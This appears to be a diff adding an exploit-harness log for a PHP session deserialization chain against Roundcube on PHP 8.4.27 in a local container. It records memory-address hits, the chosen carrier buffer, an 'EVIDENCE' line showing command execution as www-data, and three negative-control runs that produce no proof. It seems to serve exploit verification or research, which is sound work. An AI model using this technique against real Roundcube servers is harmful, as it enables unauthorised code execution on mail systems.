@@ -1,0 +1,41 @@
+=== simple 8.4.27 ===
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18310 container php2shell-rc-8427 spray 3048
+[s] response=HTTP/1.1 200 OK proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+[s] plugin log:
+1793404264.187989 pid=29 plugin-load handler=php_serialize name=PHPSESSID
+1793404264.188036 pid=29 handler-switched handler=php
+1793404264.188881 pid=29 simple-dtor
+1793404264.191581 pid=29 plugin-init task=.*
+
+=== terminal 8.4.27 ===
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18310 container php2shell-rc-8427 spray 3048
+[m] magic hits=8 raw-input=6 session-buffer=3
+[m]   hit=0xffffab66c82d vstart=0xffffab66c019 delta=0x6c019 sessbuf=False pre64_tail=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'(\x00\x00\x00\x00\x00\x00|"
+[m]   hit=0xffffab67082d vstart=0xffffab670019 delta=0x70019 sessbuf=False pre64_tail=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'(\x00\x00\x00\x00\x00\x00|"
+[m]   hit=0xffffab67a1d5 vstart=0xffffab6799c1 delta=0x799c1 sessbuf=True pre64_tail=b'essed";i:1;}}}s:10295:"upload_progress_|'
+[m]   hit=0xffffab68083d vstart=0xffffab680029 delta=0x80029 sessbuf=True pre64_tail=b'\x00\x00\x00\x16\x00\x00\x00B\rH"2*\x19\xe07(\x00\x00\x00\x00\x00\x00upload_progress_|'
+[m]   hit=0xffffab68e1d5 vstart=0xffffab68d9c1 delta=0x8d9c1 sessbuf=True pre64_tail=b'essed";i:1;}}}s:10295:"upload_progress_|'
+[m]   hit=0xffffaef7f9ae vstart=0xffffaef7f19a delta=0x397f19a sessbuf=False pre64_tail=b' name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n|'
+[m] carrier candidate = highest-address session buffer
+[m] pid=142 main=0xffffab600000 lib=0xffffad780000 zif=0xffffadbb1510
+[m] magic=0xffffab68e1d5 carrier=0xffffab68d9d5 value_string=0xffffab68d9c1 delta=0x8d9c1
+[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+[EVIDENCE] Roundcube 115560 session decode -> var_destroy -> uid=33
+=== control bias-zif +0x1000 ===
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18310 container php2shell-rc-8427 spray 3048
+    [!] BIAS zif by 0x1000 (control: must not fire)
+[f] response=<none> proof=''
+[!] no proof written
+=== control no-switch ===
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18310 container php2shell-rc-8427 spray 3048
+[f] response=HTTP/1.1 200 OK proof=''
+[!] no proof written
+=== control nogadget ===
+[*] Roundcube 115560 terminal (8.4.27)
+    target 127.0.0.1:18310 container php2shell-rc-8427 spray 3048
+[f] response=HTTP/1.1 200 OK proof=''
+[!] no proof written
